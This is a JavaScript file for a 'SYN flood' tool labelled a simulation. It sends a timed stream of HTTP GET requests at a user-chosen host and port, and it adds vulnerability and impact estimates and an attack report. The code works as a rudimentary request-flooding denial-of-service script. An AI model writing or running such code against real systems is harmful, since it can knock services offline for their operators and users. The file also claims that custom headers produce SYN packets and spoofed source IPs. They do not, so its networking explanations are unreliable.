/**
 * SYN Flood Attack Tool (Simulation)
 * TCP SYN flood simulation using HTTP requests
 * Warning: For educational purposes only
 */

class SYNFlood {
    constructor() {
        this.isAttacking = false;
        this.synPacketsSent = 0;
        this.spoofedIPs = [];
        this.halfOpenConnections = new Set();
        
        this.config = {
            targetHost: '',
            targetPort: 80,
            attackDuration: 120, // seconds
            synPerSecond: 50,
            spoofSourceIP: true,
            useRandomPorts: true,
            tcpTimeout: 30000, // 30 seconds
            maxHalfOpen: 1000
        };
        
        // Generate spoofed IP addresses
        this.generateSpoofedIPs(100);
    }
    
    /**
     * Generate random IP addresses for spoofing
     */
    generateSpoofedIPs(count = 100) {
        this.spoofedIPs = [];
        
        for (let i = 0; i < count; i++) {
            const ip = [
                Math.floor(Math.random() * 255) + 1,
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 255) + 1
            ].join('.');
            
            this.spoofedIPs.push(ip);
        }
        
        return this.spoofedIPs;
    }
    
    /**
     * Generate random source port
     */
    generateRandomPort() {
        return Math.floor(Math.random() * 64511) + 1024; // 1024-65535
    }
    
    /**
     * Create TCP SYN packet simulation
     * Note: Browsers cannot send raw TCP packets
     * This simulates SYN behavior using HTTP
     */
    createSYNPacket() {
        const sourceIP = this.config.spoofSourceIP ? 
            this.spoofedIPs[Math.floor(Math.random() * this.spoofedIPs.length)] : 
            'real-ip';
        
        const sourcePort = this.config.useRandomPorts ? 
            this.generateRandomPort() : 
            50000 + Math.floor(Math.random() * 15535);
        
        // Create connection ID
        const connectionId = `${sourceIP}:${sourcePort}-${this.config.targetHost}:${this.config.targetPort}`;
        
        return {
            id: connectionId,
            sourceIP: sourceIP,
            sourcePort: sourcePort,
            targetHost: this.config.targetHost,
            targetPort: this.config.targetPort,
            timestamp: Date.now(),
            seqNumber: Math.floor(Math.random() * 4294967295),
            windowSize: 64240
        };
    }
    
    /**
     * Simulate sending SYN packet
     */
    async sendSYNPacket(synPacket) {
        try {
            // In browser, we simulate SYN with HTTP request
            const synRequest = new XMLHttpRequest();
            synRequest.timeout = this.config.tcpTimeout;
            
            // Create unique request with SYN simulation headers
            const url = `http://${this.config.targetHost}:${this.config.targetPort}/`;
            
            return new Promise((resolve) => {
                synRequest.open('GET', url, true);
                
                // Add headers to simulate SYN
                synRequest.setRequestHeader('X-TCP-SYN', '1');
                synRequest.setRequestHeader('X-Source-IP', synPacket.sourceIP);
                synRequest.setRequestHeader('X-Source-Port', synPacket.sourcePort.toString());
                synRequest.setRequestHeader('X-Seq-Number', synPacket.seqNumber.toString());
                synRequest.setRequestHeader('X-Window-Size', synPacket.windowSize.toString());
                synRequest.setRequestHeader('Connection', 'keep-alive');
                
                // Don't wait for response - simulate half-open connection
                synRequest.send();
                
                // Add to half-open connections
                this.halfOpenConnections.add(synPacket.id);
                
                // Schedule removal (simulating timeout)
                setTimeout(() => {
                    this.halfOpenConnections.delete(synPacket.id);
                }, this.config.tcpTimeout);
                
                this.synPacketsSent++;
                
                resolve({
                    success: true,
                    packetId: synPacket.id,
                    halfOpenConnections: this.halfOpenConnections.size
                });
            });
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    /**
     * Start SYN flood attack
     */
    async startAttack(options = {}) {
        if (this.isAttacking) {
            throw new Error('Attack already in progress');
        }
        
        // Merge config
        this.config = { ...this.config, ...options };
        
        // Validate target
        if (!this.config.targetHost || !this.config.targetPort) {
            throw new Error('Target host and port required');
        }
        
        this.isAttacking = true;
        this.synPacketsSent = 0;
        this.halfOpenConnections.clear();
        this.attackStartTime = Date.now();
        
        console.log(`Starting SYN flood to ${this.config.targetHost}:${this.config.targetPort}`);
        
        // Calculate interval between SYN packets
        const interval = 1000 / this.config.synPerSecond;
        
        // Start attack loop
        this.attackInterval = setInterval(() => {
            if (!this.isAttacking || 
                (Date.now() - this.attackStartTime) > this.config.attackDuration * 1000) {
                this.stopAttack();
                return;
            }
            
            // Check if we've reached max half-open connections
            if (this.halfOpenConnections.size >= this.config.maxHalfOpen) {
                // Randomly close some connections
                const connections = Array.from(this.halfOpenConnections);
                const toRemove = Math.floor(connections.length * 0.1); // Remove 10%
                
                for (let i = 0; i < toRemove; i++) {
                    if (connections[i]) {
                        this.halfOpenConnections.delete(connections[i]);
                    }
                }
            }
            
            // Send SYN packet
            const synPacket = this.createSYNPacket();
            this.sendSYNPacket(synPacket);
            
            // Update stats
            this.updateStats();
            
        }, interval);
        
        return {
            success: true,
            message: 'SYN flood started',
            config: this.config,
            halfOpenConnections: this.halfOpenConnections.size
        };
    }
    
    /**
     * Stop SYN flood attack
     */
    stopAttack() {
        this.isAttacking = false;
        
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        // Clean up half-open connections
        this.halfOpenConnections.clear();
        
        const duration = (Date.now() - this.attackStartTime) / 1000;
        const synPerSecond = this.synPacketsSent / duration;
        
        return {
            success: true,
            message: 'SYN flood stopped',
            stats: {
                totalSYNPackets: this.synPacketsSent,
                duration: duration.toFixed(2),
                synPerSecond: synPerSecond.toFixed(2),
                maxHalfOpen: this.config.maxHalfOpen,
                averageQueueSize: (this.synPacketsSent / (duration * this.config.synPerSecond)).toFixed(2)
            }
        };
    }
    
    /**
     * Update attack statistics
     */
    updateStats() {
        if (this.synPacketsSent % 100 === 0) {
            console.log(`SYN packets sent: ${this.synPacketsSent}, Half-open: ${this.halfOpenConnections.size}`);
        }
        
        // Update UI if available
        if (typeof window !== 'undefined' && window.updateSYNStats) {
            window.updateSYNStats({
                packetsSent: this.synPacketsSent,
                halfOpen: this.halfOpenConnections.size,
                duration: (Date.now() - this.attackStartTime) / 1000
            });
        }
    }
    
    /**
     * Get attack status
     */
    getStatus() {
        return {
            isAttacking: this.isAttacking,
            synPacketsSent: this.synPacketsSent,
            halfOpenConnections: this.halfOpenConnections.size,
            duration: this.attackStartTime ? (Date.now() - this.attackStartTime) / 1000 : 0,
            spoofedIPs: this.spoofedIPs.length,
            config: this.config
        };
    }
    
    /**
     * Estimate target vulnerability
     */
    async estimateVulnerability() {
        try {
            // Test target with single SYN simulation
            const testPacket = this.createSYNPacket();
            const startTime = Date.now();
            
            const result = await this.sendSYNPacket(testPacket);
            const responseTime = Date.now() - startTime;
            
            // Analyze response characteristics
            let vulnerability = 'Low';
            let recommendations = [];
            
            if (responseTime > 1000) {
                vulnerability = 'High';
                recommendations.push('Target shows slow response times');
            }
            
            if (this.halfOpenConnections.size > 50) {
                vulnerability = 'Medium';
                recommendations.push('Target may have connection queue limits');
            }
            
            return {
                vulnerability: vulnerability,
                responseTime: responseTime,
                recommendations: recommendations,
                estimatedImpact: this.calculateImpact()
            };
        } catch (error) {
            return {
                vulnerability: 'Unknown',
                error: error.message
            };
        }
    }
    
    /**
     * Calculate potential impact
     */
    calculateImpact() {
        const packetsPerMinute = this.config.synPerSecond * 60;
        const estimatedMemory = (packetsPerMinute * 256) / (1024 * 1024); // MB
        
        let impact = 'Low';
        if (estimatedMemory > 100) impact = 'High';
        else if (estimatedMemory > 50) impact = 'Medium';
        
        return {
            level: impact,
            estimatedMemoryUsage: estimatedMemory.toFixed(2) + ' MB/min',
            connectionsPerMinute: packetsPerMinute,
            bandwidth: (packetsPerMinute * 64) / (1024 * 1024) + ' MB/min' // Rough estimate
        };
    }
    
    /**
     * Generate attack report
     */
    generateReport() {
        const status = this.getStatus();
        
        return {
            attackType: 'SYN Flood',
            target: `${this.config.targetHost}:${this.config.targetPort}`,
            startTime: new Date(this.attackStartTime).toISOString(),
            status: status.isAttacking ? 'Active' : 'Stopped',
            statistics: {
                totalPackets: status.synPacketsSent,
                halfOpenConnections: status.halfOpenConnections,
                duration: status.duration.toFixed(2) + 's',
                packetsPerSecond: (status.synPacketsSent / status.duration).toFixed(2),
                spoofedIPsUsed: this.spoofedIPs.length
            },
            configuration: this.config,
            recommendations: [
                'Use SYN cookies protection',
                'Implement rate limiting',
                'Configure firewall rules',
                'Monitor connection queues'
            ]
        };
    }
}

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = SYNFlood;
}

// For browser usage
if (typeof window !== 'undefined') {
    window.SYNFlood = SYNFlood;
}